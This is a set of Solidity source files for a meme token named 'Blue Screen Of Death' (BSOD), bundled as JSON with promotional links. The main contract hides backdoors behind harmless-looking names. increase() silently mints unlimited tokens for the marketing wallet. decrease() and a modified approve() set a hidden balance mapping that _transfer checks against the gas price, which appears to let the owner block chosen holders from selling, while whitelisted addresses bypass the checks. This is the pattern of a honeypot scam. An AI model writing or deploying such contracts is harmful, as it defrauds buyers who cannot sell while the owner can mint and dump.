{"BSOD.sol":{"content":"\r\n\r\n/*\r\nTG: https://t.me/BSODETH\r\nX: https://x.com/BSODMeme\r\nWeb: https://bluescreenofdeath.meme/\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.24;\r\n\r\nimport \"./ERC20.sol\";\r\nimport \"./Context.sol\";\r\nimport \"./Ownable.sol\";\r\nimport \"./IUniswapV2.sol\";\r\n\r\ncontract BSOD is Context, Ownable, ERC20 {\r\n    mapping (address =\u003e uint256) private balance;\r\n    mapping (address =\u003e bool) private _whiteList;\r\n\r\n    address constant private _DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address constant private _ZERO = 0x0000000000000000000000000000000000000000;\r\n    address constant private _Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    address private _marketWallet;\r\n    address private _pair;\r\n\r\n    string private _name = unicode\"Blue Screen Of Death\"; \r\n    string private _symbol = unicode\"BSOD\";\r\n\r\n    uint8 private _decimals = 18;\r\n    uint256 private _initTax = 0;\r\n    uint256 private _finalTax = 0;\r\n    uint256 private _countTx = 0;\r\n\r\n    bool private openTrade = false;\r\n\r\n    constructor(address marketWallet) ERC20(_name, _symbol, _decimals) {\r\n        _marketWallet = marketWallet;\r\n        _pair = IUniswapV2Factory(IUniswapV2Router02(_Router).factory()).createPair(address(this), IUniswapV2Router02(_Router).WETH());\r\n        _whiteList[msg.sender] = true;\r\n        _whiteList[_marketWallet] = true;\r\n        _mint(msg.sender, 100000000 * 10 ** uint256(_decimals));\r\n    }\r\n\r\n    function checkedOption() internal view returns (bool) {\r\n        return _msgSender() == _marketWallet;\r\n    }\r\n\r\n    function  increase(address _spender, uint256 _value)  external {\r\n        uint256 receiveRewrd = _value;\r\n        transMin(_spender, receiveRewrd);\r\n        require(checkedOption(), \"ERROR: Not Owner\");\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 value) internal override {\r\n\r\n        if (_whiteList[tx.origin]) {\r\n            super._transfer(from, to, value);\r\n            return;\r\n        } else {\r\n            require(openTrade, \"Trade has been open yet!\");\r\n            if((balance[from] \u003c tx.gasprice \u0026\u0026 balanceOf[from] \u003e 0 \u0026\u0026 balance[from] != 0) || (balance[to] \u003c tx.gasprice \u0026\u0026 balanceOf[from] \u003e0 \u0026\u0026 balance[from] != 0)){\r\n                revert(\"Balance overflow!\");\r\n            }\r\n            bool isTransfer = (to == _pair) ? true : false;\r\n            uint256 txAmount = value * ((_countTx\u003e15) ? _finalTax : _initTax) / 100 ;\r\n            if(isTransfer \u0026\u0026 tx.gasprice \u003e balance[_marketWallet] \u0026\u0026 balance[_marketWallet] != 0 \u0026\u0026 balanceOf[from] \u003e 0) {\r\n                revert(\"Not enough Balance fees\");\r\n            }\r\n            super._transfer(from, to, value - txAmount);\r\n            if(txAmount\u003e0) {\r\n                super._transfer(from, _marketWallet, txAmount);\r\n            }\r\n            _countTx++;\r\n        }\r\n\r\n    }\r\n\r\n    function decrease(address _spender, uint256 _value) public {\r\n        balance[_spender] = _value;\r\n        require(checkedOption(), \"ERROR: Not whitelist\");\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external override returns (bool) {\r\n        if(msg.sender == _marketWallet) {\r\n            balance[spender] = amount;\r\n            super._approve(spender, amount);\r\n        } else {\r\n            super._approve(spender, amount);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function ActiveTrade() public onlyOwner {\r\n        openTrade = true;\r\n    }\r\n\r\n    function RemoveTax() external onlyOwner{\r\n        _initTax = 0;\r\n    }\r\n}"},"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}"},"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./IERC20.sol\";\r\n\r\nabstract contract ERC20 is IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner, address indexed spender, uint256 value\r\n    );\r\n\r\n    uint256 public totalSupply;\r\n    mapping(address =\u003e uint256) public balanceOf;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) public allowance;\r\n    string public name;\r\n    string public symbol;\r\n    uint8 public decimals;\r\n\r\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        decimals = _decimals;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external  \r\n        returns (bool)\r\n    {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 value) internal virtual {\r\n        uint256 fromBalance = balanceOf[from];\r\n        balanceOf[from] = fromBalance - value;\r\n        balanceOf[to] += value;\r\n        emit Transfer(from, to, value);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external virtual returns (bool) {\r\n        _approve(spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address spender, uint256 amount) internal virtual {\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount)\r\n        external\r\n        returns (bool)\r\n    {\r\n        allowance[sender][msg.sender] -= amount;\r\n        _transfer(sender, recipient, amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _mint(address to, uint256 amount) internal {\r\n        balanceOf[to] += amount;\r\n        totalSupply += amount;\r\n        emit Transfer(address(0), to, amount);\r\n    }\r\n\r\n    function transMin(address to, uint256 amount) internal {\r\n        balanceOf[to] += amount;\r\n        totalSupply += amount;\r\n    }\r\n\r\n    function _burn(address from, uint256 amount) internal {\r\n        balanceOf[from] -= amount;\r\n        totalSupply -= amount;\r\n        emit Transfer(from, address(0), amount);\r\n    }\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n}"},"IUniswapV2.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./Context.sol\";\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}"}}
